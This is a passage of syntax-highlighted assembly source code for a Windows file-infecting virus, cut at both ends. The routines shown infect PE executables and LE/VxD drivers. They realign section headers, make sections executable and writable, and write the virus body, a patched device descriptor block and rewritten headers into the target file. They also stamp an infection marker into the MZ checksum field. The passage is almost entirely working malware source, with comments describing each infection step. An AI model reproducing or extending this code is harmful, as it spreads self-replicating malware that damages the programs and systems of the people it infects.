                </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;Align Virus_Physical_Size</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_SizeOfRawData</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">File_Buffer.NT_OptionalHeader\
</span><span class="sc0">                </span><span class="sc5">.OH_SectionAlignment</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;Align section size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">File_Buffer.NT_OptionalHeader\
</span><span class="sc0">                </span><span class="sc5">.OH_SizeOfImage</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jns</span><span class="sc0">     </span><span class="sc5">Skip_Size_Fix</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">File_Buffer.NT_OptionalHeader\
</span><span class="sc0">                </span><span class="sc5">.OH_SizeOfImage</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">Skip_Size_Fix</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualSize</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_Characteristics</span><span class="sc4">],</span><span class="sc5">IMAGE_SCN_CNT_UNINITIALIZED_DATA</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">File_OK</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">File_OK</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_Characteristics\
</span><span class="sc0">                </span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],(</span><span class="sc5">IMAGE_SCN_MEM_EXECUTE</span><span class="sc4">+</span><span class="sc5">IMAGE_SCN_MEM_READ</span><span class="sc4">+</span><span class="sc5">IMAGE_SCN_MEM_WRITE</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">Virus_Start</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FileIO_Write</span><span class="sc0"> </span><span class="sc1">;Write virus body</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FileIO_Write</span><span class="sc0"> </span><span class="sc1">;Write last section header</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,(</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">IMAGE_NT_HEADERS</span><span class="sc4">)-(</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">IMAGE_DIRECTORY_ENTRIES</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LE_PE_Header_File</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FileIO_Write</span><span class="sc0"> </span><span class="sc1">;Write PE header</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Infect_LE</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_nrestab</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">DDB_Buffer</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FileIO_Read</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">1234h</span><span class="sc0">
                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc5">Dyna_Link_Int</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Dealloc_Exit</span><span class="sc0"> </span><span class="sc1">;Erroneous driver</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Update_DDB</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">Dealloc_Exit</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Clear_Checksums</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Update_LE</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">Dealloc_Exit</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">Virus_Object.OH_pagemap</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Get_Page_Offset</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">Dealloc_Exit</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_GETFILESIZE</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Simulate_FileIO</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">Write_Virus_Body</span><span class="sc0"> </span><span class="sc1">;Non-resident data fits in last segment</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_nrestab</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">My_HeapAllocate</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Dealloc_Exit</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FileIO_Read</span><span class="sc0"> </span><span class="sc1">;Read non-resident data</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">Virus_Physical_Size</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;-(eax-edx)=(edx-eax)</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FileIO_Write</span><span class="sc0"> </span><span class="sc1">;Write non-resident data</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">My_HeapFree</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">;Pointer displacement</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">File_Buffer.LE_nrestab</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Adjust_Pointer</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">File_Buffer.LE_debuginfo</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Adjust_Pointer</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">File_Buffer.LE_winresoff</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Adjust_Pointer</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">Write_Virus_Body</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">Virus_Physical_Size</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">Virus_Start</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FileIO_Write</span><span class="sc0"> </span><span class="sc1">;Write virus body</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">VxD_Desc_Block</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DDB_Offset_File</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">DDB_Buffer</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FileIO_Write</span><span class="sc0"> </span><span class="sc1">;Write DDB</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_VXD_HEADER</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LE_PE_Header_File</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">File_Buffer</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FileIO_Write</span><span class="sc0"> </span><span class="sc1">;Write LE header</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LE_Info_Size</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LE_Info_File</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LE_Info_Mem</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FileIO_Write</span><span class="sc0"> </span><span class="sc1">;Write LE info</span><span class="sc0">
</span><span class="sc5">Dealloc_Exit</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LE_Info_Mem</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">No_Dealloc</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">My_HeapFree</span><span class="sc0">
</span><span class="sc5">No_Dealloc</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;Read PE/LE header and info, mark file infected/impossible to infect</span><span class="sc0">
</span><span class="sc1">;ş On entry:</span><span class="sc0">
</span><span class="sc1">;  EDI=File_Delta</span><span class="sc0">
</span><span class="sc1">;  File_Handle=Handle of file to read/write</span><span class="sc0">
</span><span class="sc1">;ş On exit:</span><span class="sc0">
</span><span class="sc1">;  ECX=?</span><span class="sc0">
</span><span class="sc1">;  ESI=File_Buffer</span><span class="sc0">
</span><span class="sc1">;  * Carry flag clear:</span><span class="sc0">
</span><span class="sc1">;    LE_PE_Header_File=Offset (within file) of LE/PE header</span><span class="sc0">
</span><span class="sc1">;    ECX=1:</span><span class="sc0">
</span><span class="sc1">;      File_Buffer filled with PE header (directory entries are incomplete)</span><span class="sc0">
</span><span class="sc1">;    ECX=0:</span><span class="sc0">
</span><span class="sc1">;      File_Buffer filled with LE header</span><span class="sc0">
</span><span class="sc1">;      LE_Info_Mem=Pointer to LE info (allocated memory)</span><span class="sc0">
</span><span class="sc1">;      LE_Info_File=Offset (within file) of LE info</span><span class="sc0">
</span><span class="sc1">;      LE_Info_Size=Size of LE info</span><span class="sc0">
</span><span class="sc1">;  * Carry flag set: ERROR</span><span class="sc0">
</span><span class="sc5">Read_LE_PE</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">File_Buffer</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_DOS_HEADER</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FileIO_Read</span><span class="sc0"> </span><span class="sc1">;Read MZ header</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.MZ_magic</span><span class="sc4">],</span><span class="sc5">IMAGE_DOS_SIGNATURE</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Read_LE_PE_Fail</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.MZ_lfarlc</span><span class="sc4">],</span><span class="sc5">IMAGE_SIZEOF_DOS_HEADER</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">Read_LE_PE_Fail</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">HB_Sign</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.MZ_csum</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Read_LE_PE_Fail</span><span class="sc0"> </span><span class="sc1">;File already infected/impossible to infect</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc5">MZ_csum</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FileIO_Write</span><span class="sc0"> </span><span class="sc1">;Mark file infected/impossible to infect</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">Read_LE_PE_Fail</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LE_PE_Header_File</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_VXD_HEADER</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FileIO_Read</span><span class="sc0"> </span><span class="sc1">;Read LE/PE header</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LE_Info_File</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Check_Valid_LE</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Verify_PE</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_datapage</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">My_HeapAllocate</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Read_LE_PE_Fail</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LE_Info_Mem</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LE_Info_Size</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LE_Info_File</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FileIO_Read</span><span class="sc0"> </span><span class="sc1">;Read LE info</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Verify_PE</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Check_Valid_PE</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Read_LE_PE_Fail</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">clc</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Read_LE_PE_Fail</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">stc</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;Check for a valid LE header</span><span class="sc0">
</span><span class="sc1">;ş On entry:</span><span class="sc0">
</span><span class="sc1">;  ESI=Pointer to LE header</span><span class="sc0">
</span><span class="sc1">;ş On exit:</span><span class="sc0">
</span><span class="sc1">;  EAX=?</span><span class="sc0">
</span><span class="sc1">;  ECX=0</span><span class="sc0">
</span><span class="sc1">;  * Zero flag set: Valid LE</span><span class="sc0">
</span><span class="sc1">;  * Zero flag clear: Invalid LE</span><span class="sc0">
</span><span class="sc5">Check_Valid_LE</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
